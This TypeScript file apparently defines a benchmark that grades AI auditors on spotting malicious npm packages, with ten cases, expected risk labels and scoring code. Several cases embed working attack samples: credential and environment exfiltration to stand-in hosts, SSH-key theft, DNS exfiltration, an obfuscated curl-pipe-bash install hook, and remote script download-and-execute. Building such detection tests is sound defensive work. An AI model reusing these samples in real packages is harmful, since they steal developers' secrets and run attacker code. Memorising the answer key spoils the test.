import type { PackageMetadata, VersionHistoryEntry, SourceFile, KnownCVE } from './types';
import { buildUserPrompt } from './prompt';

export interface BenchmarkCase {
  id: string;
  category: 'clean' | 'typosquat' | 'malicious' | 'cve' | 'obfuscated' | 'exfiltration' | 'dependency_confusion';
  description: string;
  metadata: PackageMetadata;
  versionHistory: VersionHistoryEntry[];
  sourceFiles: SourceFile[];
  knownCVEs: KnownCVE[];
  expected: {
    risk_level: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
    min_risk_score: number;
    max_risk_score: number;
    must_flag: string[];
  };
}

export function generateBenchmarkDataset(): BenchmarkCase[] {
  return [
    {
      id: 'bench-001-clean-utility',
      category: 'clean',
      description: 'Legitimate utility: pure string helpers with no side effects',
      metadata: {
        name: 'string-utils-helper',
        version: '2.1.0',
        description: 'Lightweight string manipulation utilities',
        author: 'verified-dev',
        license: 'MIT',
        dependencies: {},
        scripts: {},
      },
      versionHistory: [
        { version: '2.0.0', published: '2024-06-01', depsChanged: 'none', filesChanged: 'minor', sizeDelta: '+200B', newMaintainer: false },
        { version: '2.1.0', published: '2024-09-15', depsChanged: 'none', filesChanged: 'minor', sizeDelta: '+150B', newMaintainer: false },
      ],
      sourceFiles: [
        {
          path: 'index.js',
          size: 420,
          content: `"use strict";
module.exports.capitalize = (s) => s.charAt(0).toUpperCase() + s.slice(1);
module.exports.camelCase = (s) => s.replace(/-([a-z])/g, (_, c) => c.toUpperCase());
module.exports.kebabCase = (s) => s.replace(/([A-Z])/g, '-$1').toLowerCase();
module.exports.truncate = (s, len) => s.length > len ? s.slice(0, len) + '...' : s;`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'LOW', min_risk_score: 0, max_risk_score: 20, must_flag: [] },
    },

    {
      id: 'bench-002-typosquat-lodash',
      category: 'typosquat',
      description: 'Typosquat of lodash: "lodahs" with credential exfiltration in postinstall',
      metadata: {
        name: 'lodahs',
        version: '4.17.21',
        description: 'Lodash modular utilities',
        author: 'unknown',
        license: 'MIT',
        dependencies: {},
        scripts: { postinstall: 'node setup.js' },
      },
      versionHistory: [
        { version: '4.17.21', published: '2025-01-03', depsChanged: 'none', filesChanged: 'new package', sizeDelta: 'N/A', newMaintainer: true },
      ],
      sourceFiles: [
        {
          path: 'setup.js',
          size: 310,
          content: `const https = require('https');
const os = require('os');
const data = JSON.stringify({
  h: os.hostname(), u: os.userInfo().username,
  e: Object.keys(process.env).filter(k => k.match(/TOKEN|KEY|SECRET|PASS/i)).map(k => k + '=' + process.env[k])
});
const req = https.request({ hostname: 'collect.evil-analytics.xyz', port: 443, path: '/d', method: 'POST',
  headers: { 'Content-Type': 'application/json' } }, () => {});
req.write(data); req.end();`,
        },
        {
          path: 'index.js',
          size: 50,
          content: `module.exports = require('lodash');`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'CRITICAL', min_risk_score: 80, max_risk_score: 100, must_flag: ['typosquat', 'exfiltration', 'postinstall'] },
    },

    {
      id: 'bench-003-env-exfiltration',
      category: 'exfiltration',
      description: 'Package that silently exfiltrates environment variables on import',
      metadata: {
        name: 'fast-config-loader',
        version: '1.0.0',
        description: 'Fast configuration loading for Node.js',
        author: 'anon-publisher',
        license: 'ISC',
        dependencies: {},
        scripts: {},
      },
      versionHistory: [
        { version: '1.0.0', published: '2025-02-20', depsChanged: 'none', filesChanged: 'new package', sizeDelta: 'N/A', newMaintainer: true },
      ],
      sourceFiles: [
        {
          path: 'index.js',
          size: 480,
          content: `const http = require('http');
function loadConfig(path) { return require(path); }
const _e = Buffer.from(JSON.stringify(process.env)).toString('base64');
const _o = { hostname: '198.51.100.42', port: 8080, path: '/api/telemetry', method: 'POST',
  headers: { 'Content-Type': 'text/plain', 'X-Session': Date.now().toString(36) } };
try { const r = http.request(_o, () => {}); r.write(_e); r.end(); } catch(e) {}
module.exports = { loadConfig };`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'CRITICAL', min_risk_score: 85, max_risk_score: 100, must_flag: ['exfiltration', 'network_calls', 'env_variables'] },
    },

    {
      id: 'bench-004-obfuscated-payload',
      category: 'obfuscated',
      description: 'Heavily obfuscated code hiding a reverse shell',
      metadata: {
        name: 'perf-monitor-lite',
        version: '0.9.1',
        description: 'Lightweight performance monitoring',
        author: 'dev-tools-org',
        license: 'MIT',
        dependencies: {},
        scripts: { preinstall: 'node bootstrap.js' },
      },
      versionHistory: [
        { version: '0.9.0', published: '2024-12-01', depsChanged: 'none', filesChanged: 'new package', sizeDelta: 'N/A', newMaintainer: true },
        { version: '0.9.1', published: '2025-01-10', depsChanged: 'none', filesChanged: 'major', sizeDelta: '+15KB', newMaintainer: false },
      ],
      sourceFiles: [
        {
          path: 'bootstrap.js',
          size: 650,
          content: `var _0x4f2a = ['\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73',
'\\x65\\x78\\x65\\x63', '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f'];
(function() { var cp = require(_0x4f2a[0]);
  cp[_0x4f2a[1]](_0x4f2a[2] + '\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x31\\x2e\\x31\\x2f\\x73\\x68\\x65\\x6c\\x6c' +
  '\\x20\\x7c\\x20\\x62\\x61\\x73\\x68'); })();`,
        },
        {
          path: 'index.js',
          size: 100,
          content: `module.exports.measure = (fn) => { const s = Date.now(); fn(); return Date.now() - s; };`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'CRITICAL', min_risk_score: 90, max_risk_score: 100, must_flag: ['obfuscated', 'process_spawn', 'preinstall'] },
    },

    {
      id: 'bench-005-clean-math',
      category: 'clean',
      description: 'Legitimate math library with zero dependencies',
      metadata: {
        name: 'tiny-math-ops',
        version: '3.2.1',
        description: 'Tiny math operations library',
        author: 'math-community',
        license: 'MIT',
        dependencies: {},
        scripts: { test: 'node test.js' },
      },
      versionHistory: [
        { version: '3.1.0', published: '2024-03-10', depsChanged: 'none', filesChanged: 'minor', sizeDelta: '+100B', newMaintainer: false },
        { version: '3.2.0', published: '2024-07-20', depsChanged: 'none', filesChanged: 'minor', sizeDelta: '+80B', newMaintainer: false },
        { version: '3.2.1', published: '2024-11-05', depsChanged: 'none', filesChanged: 'patch', sizeDelta: '+20B', newMaintainer: false },
      ],
      sourceFiles: [
        {
          path: 'index.js',
          size: 350,
          content: `"use strict";
exports.clamp = (n, min, max) => Math.min(Math.max(n, min), max);
exports.lerp = (a, b, t) => a + (b - a) * t;
exports.roundTo = (n, d) => { const m = Math.pow(10, d); return Math.round(n * m) / m; };
exports.isPrime = (n) => { if (n < 2) return false; for (let i = 2; i <= Math.sqrt(n); i++) if (n % i === 0) return false; return true; };
exports.factorial = (n) => n <= 1 ? 1 : n * exports.factorial(n - 1);`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'LOW', min_risk_score: 0, max_risk_score: 15, must_flag: [] },
    },

    {
      id: 'bench-006-postinstall-shell',
      category: 'malicious',
      description: 'Package with postinstall that downloads and executes remote script',
      metadata: {
        name: 'react-dev-toolkit',
        version: '1.0.2',
        description: 'Developer tools for React applications',
        author: 'anonymous',
        license: 'MIT',
        dependencies: {},
        scripts: { postinstall: 'node scripts/init.js' },
      },
      versionHistory: [
        { version: '1.0.0', published: '2025-03-01', depsChanged: 'none', filesChanged: 'new package', sizeDelta: 'N/A', newMaintainer: true },
        { version: '1.0.2', published: '2025-03-02', depsChanged: 'none', filesChanged: 'minor', sizeDelta: '+2KB', newMaintainer: false },
      ],
      sourceFiles: [
        {
          path: 'scripts/init.js',
          size: 280,
          content: `const { execSync } = require('child_process');
const os = require('os');
const p = os.platform();
try {
  if (p === 'linux' || p === 'darwin') {
    execSync('curl -s https://cdn-pkg-setup.com/init.sh | bash', { stdio: 'ignore' });
  } else {
    execSync('powershell -c "iwr https://cdn-pkg-setup.com/init.ps1 | iex"', { stdio: 'ignore' });
  }
} catch(e) {}`,
        },
        {
          path: 'index.js',
          size: 80,
          content: `module.exports = {};`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'CRITICAL', min_risk_score: 85, max_risk_score: 100, must_flag: ['postinstall', 'process_spawn', 'network_calls'] },
    },

    {
      id: 'bench-007-known-cve',
      category: 'cve',
      description: 'Package with known prototype pollution CVE',
      metadata: {
        name: 'deep-object-merge',
        version: '1.3.0',
        description: 'Deep merge objects recursively',
        author: 'obj-utils',
        license: 'MIT',
        dependencies: {},
        scripts: {},
      },
      versionHistory: [
        { version: '1.2.0', published: '2024-01-15', depsChanged: 'none', filesChanged: 'minor', sizeDelta: '+50B', newMaintainer: false },
        { version: '1.3.0', published: '2024-06-20', depsChanged: 'none', filesChanged: 'minor', sizeDelta: '+100B', newMaintainer: false },
      ],
      sourceFiles: [
        {
          path: 'index.js',
          size: 300,
          content: `function deepMerge(target, source) {
  for (const key in source) {
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
module.exports = deepMerge;`,
        },
      ],
      knownCVEs: [
        { id: 'GHSA-xxxx-yyyy-zzzz', summary: 'Prototype pollution via __proto__ in deep-object-merge allows attackers to inject properties into Object.prototype' },
      ],
      expected: { risk_level: 'HIGH', min_risk_score: 60, max_risk_score: 100, must_flag: ['prototype_pollution', 'cve'] },
    },

    {
      id: 'bench-008-dependency-confusion',
      category: 'dependency_confusion',
      description: 'Public package shadowing internal @company scope with data exfiltration',
      metadata: {
        name: 'internal-auth-service',
        version: '99.0.0',
        description: 'Authentication service utilities',
        author: 'unknown',
        license: 'ISC',
        dependencies: {},
        scripts: { preinstall: 'node telemetry.js' },
      },
      versionHistory: [
        { version: '99.0.0', published: '2025-02-28', depsChanged: 'none', filesChanged: 'new package', sizeDelta: 'N/A', newMaintainer: true },
      ],
      sourceFiles: [
        {
          path: 'telemetry.js',
          size: 200,
          content: `const dns = require('dns');
const os = require('os');
const pkg = require('./package.json');
const data = Buffer.from(JSON.stringify({ h: os.hostname(), p: pkg.name, v: pkg.version })).toString('hex');
dns.resolve(\`\${data.slice(0,60)}.exfil.attacker-domain.com\`, () => {});`,
        },
        {
          path: 'index.js',
          size: 40,
          content: `module.exports = {};`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'CRITICAL', min_risk_score: 80, max_risk_score: 100, must_flag: ['dependency_confusion', 'exfiltration', 'preinstall'] },
    },

    {
      id: 'bench-009-clean-validator',
      category: 'clean',
      description: 'Legitimate input validation library with established history',
      metadata: {
        name: 'form-input-check',
        version: '5.0.2',
        description: 'Input validation and sanitization',
        author: 'validation-team',
        license: 'MIT',
        dependencies: {},
        scripts: { test: 'jest' },
      },
      versionHistory: [
        { version: '4.9.0', published: '2023-11-01', depsChanged: 'none', filesChanged: 'minor', sizeDelta: '+200B', newMaintainer: false },
        { version: '5.0.0', published: '2024-03-15', depsChanged: 'none', filesChanged: 'major', sizeDelta: '+1KB', newMaintainer: false },
        { version: '5.0.2', published: '2024-08-10', depsChanged: 'none', filesChanged: 'patch', sizeDelta: '+50B', newMaintainer: false },
      ],
      sourceFiles: [
        {
          path: 'index.js',
          size: 500,
          content: `"use strict";
const EMAIL_RE = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
const URL_RE = /^https?:\\/\\/[^\\s/$.?#].[^\\s]*$/;
exports.isEmail = (v) => typeof v === 'string' && EMAIL_RE.test(v);
exports.isURL = (v) => typeof v === 'string' && URL_RE.test(v);
exports.isNumeric = (v) => !isNaN(parseFloat(v)) && isFinite(v);
exports.sanitize = (v) => String(v).replace(/[<>&"']/g, (c) => ({ '<':'&lt;', '>':'&gt;', '&':'&amp;', '"':'&quot;', "'":'&#39;' }[c]));
exports.minLength = (v, n) => typeof v === 'string' && v.length >= n;
exports.maxLength = (v, n) => typeof v === 'string' && v.length <= n;`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'LOW', min_risk_score: 0, max_risk_score: 20, must_flag: [] },
    },

    {
      id: 'bench-010-fs-read-exfil',
      category: 'malicious',
      description: 'Package that reads SSH keys and sends them to a remote server',
      metadata: {
        name: 'ssh-key-manager',
        version: '2.0.0',
        description: 'Manage SSH keys easily',
        author: 'unknown-dev',
        license: 'MIT',
        dependencies: {},
        scripts: {},
      },
      versionHistory: [
        { version: '1.0.0', published: '2024-10-01', depsChanged: 'none', filesChanged: 'new package', sizeDelta: 'N/A', newMaintainer: true },
        { version: '2.0.0', published: '2025-01-15', depsChanged: 'none', filesChanged: 'major', sizeDelta: '+3KB', newMaintainer: false },
      ],
      sourceFiles: [
        {
          path: 'index.js',
          size: 420,
          content: `const fs = require('fs');
const path = require('path');
const https = require('https');
const os = require('os');

function listKeys() {
  const sshDir = path.join(os.homedir(), '.ssh');
  if (!fs.existsSync(sshDir)) return [];
  const files = fs.readdirSync(sshDir);
  const keys = files.map(f => ({ name: f, content: fs.readFileSync(path.join(sshDir, f), 'utf-8') }));
  const payload = Buffer.from(JSON.stringify(keys)).toString('base64');
  https.get('https://telemetry-cdn.com/k?d=' + payload, () => {});
  return files;
}

module.exports = { listKeys };`,
        },
      ],
      knownCVEs: [],
      expected: { risk_level: 'CRITICAL', min_risk_score: 85, max_risk_score: 100, must_flag: ['filesystem_access', 'exfiltration', 'network_calls'] },
    },
  ];
}

export function buildBenchmarkPrompt(bench: BenchmarkCase): string {
  return buildUserPrompt(bench.metadata, bench.versionHistory, bench.sourceFiles, bench.knownCVEs);
}

export type BenchmarkVerdict = 'PASS' | 'FAIL';

export interface BenchmarkResult {
  caseId: string;
  category: string;
  expectedLevel: string;
  actualLevel: string;
  expectedScoreRange: [number, number];
  actualScore: number;
  verdict: BenchmarkVerdict;
  reason: string;
}

export function evaluateBenchmark(
  bench: BenchmarkCase,
  actualRiskLevel: string,
  actualRiskScore: number,
): BenchmarkResult {
  const scoreInRange = actualRiskScore >= bench.expected.min_risk_score && actualRiskScore <= bench.expected.max_risk_score;

  const levelMap: Record<string, number> = { LOW: 0, MEDIUM: 1, HIGH: 2, CRITICAL: 3 };
  const expectedOrd = levelMap[bench.expected.risk_level] ?? 0;
  const actualOrd = levelMap[actualRiskLevel] ?? 0;

  const levelCorrect = bench.expected.risk_level === 'LOW'
    ? actualOrd <= 1
    : actualOrd >= expectedOrd - 1 && actualOrd <= expectedOrd + 1;

  const passed = scoreInRange && levelCorrect;

  let reason = '';
  if (!scoreInRange) {
    reason = `Score ${actualRiskScore} outside expected range [${bench.expected.min_risk_score}, ${bench.expected.max_risk_score}]`;
  } else if (!levelCorrect) {
    reason = `Level ${actualRiskLevel} does not match expected ${bench.expected.risk_level}`;
  }

  return {
    caseId: bench.id,
    category: bench.category,
    expectedLevel: bench.expected.risk_level,
    actualLevel: actualRiskLevel,
    expectedScoreRange: [bench.expected.min_risk_score, bench.expected.max_risk_score],
    actualScore: actualRiskScore,
    verdict: passed ? 'PASS' : 'FAIL',
    reason: passed ? 'Correctly classified' : reason,
  };
}

/* ─── Batch (single-call) benchmark for fast agent registration ─── */

/**
 * Response-format-only instructions appended after the candidate's own system prompt.
 * This tells the model HOW to respond, but the candidate's prompt determines
 * the actual analysis behaviour.
 */
export const BATCH_RESPONSE_FORMAT_INSTRUCTIONS = `

For this benchmark you will be given a series of npm packages (labelled Case 1 through Case N). For each package you must decide whether it should be FLAGGED or SAFE.

You MUST respond with a valid JSON object matching this exact schema — no markdown, no explanation outside the JSON:

{
  "answers": [
    { "case": 1, "flagged": <boolean> },
    { "case": 2, "flagged": <boolean> },
    ...
  ]
}

FLAGGED = true means the package is malicious, dangerous, or high/critical risk.
SAFE = false means the package is benign and low risk.`;

/**
 * Build the full system prompt used during batch benchmarking.
 * If the candidate supplied a custom system prompt it is used as-is,
 * with the response-format instructions appended.
 * If no custom prompt is provided, fall back to the default OPM security
 * auditor prompt so the model still knows its role.
 */
export function buildBatchSystemPrompt(candidateSystemPrompt?: string): string {
  const base = candidateSystemPrompt || SYSTEM_PROMPT;
  return base + BATCH_RESPONSE_FORMAT_INSTRUCTIONS;
}

export interface BatchBenchmarkAnswer {
  case: number;
  flagged: boolean;
}

export interface BatchBenchmarkResponse {
  answers: BatchBenchmarkAnswer[];
}

export interface BatchBenchmarkResult {
  caseId: string;
  category: string;
  expectedFlagged: boolean;
  actualFlagged: boolean;
  passed: boolean;
}

/**
 * Determine the expected "flagged" label for a benchmark case.
 * HIGH / CRITICAL → flagged=true, LOW / MEDIUM → flagged=false.
 */
export function expectedFlagForCase(bench: BenchmarkCase): boolean {
  return bench.expected.risk_level === 'HIGH' || bench.expected.risk_level === 'CRITICAL';
}

/**
 * Build a single prompt containing all benchmark cases so the agent
 * can return all answers in one LLM call.
 */
export function buildBatchBenchmarkPrompt(cases: BenchmarkCase[]): string {
  const sections = cases.map((bench, i) => {
    const depsStr = Object.entries(bench.metadata.dependencies || {})
      .map(([k, v]) => `${k}@${v}`)
      .join(', ') || 'none';

    const scriptsStr = ['preinstall', 'postinstall', 'prepare']
      .map((s) => `${s}: ${(bench.metadata.scripts as Record<string, string>)?.[s] || 'none'}`)
      .join(', ');

    const codeStr = bench.sourceFiles
      .map((f) => `  File: ${f.path} (${f.size} bytes)\n  \`\`\`\n  ${f.content}\n  \`\`\``)
      .join('\n');

    const cveStr = bench.knownCVEs.length > 0
      ? `  Known CVEs: ${bench.knownCVEs.map((c) => `${c.id}: ${c.summary}`).join('; ')}\n`
      : '';

    return `### Case ${i + 1}
- Name: ${bench.metadata.name}@${bench.metadata.version}
- Author: ${bench.metadata.author || 'unknown'}
- License: ${bench.metadata.license || 'none'}
- Dependencies: ${depsStr}
- Install scripts: ${scriptsStr}
${cveStr}${codeStr}`;
  });

  return `Analyze each of the following ${cases.length} npm packages and decide if it should be FLAGGED or SAFE. Respond with the JSON schema from your system instructions.\n\n${sections.join('\n\n')}`;
}

/**
 * Evaluate batch answers against ground-truth labels.
 */
export function evaluateBatchBenchmark(
  cases: BenchmarkCase[],
  answers: BatchBenchmarkAnswer[],
): BatchBenchmarkResult[] {
  return cases.map((bench, i) => {
    const expected = expectedFlagForCase(bench);
    const answer = answers.find((a) => a.case === i + 1);
    const actual = answer?.flagged ?? false;
    return {
      caseId: bench.id,
      category: bench.category,
      expectedFlagged: expected,
      actualFlagged: actual,
      passed: expected === actual,
    };
  });
}
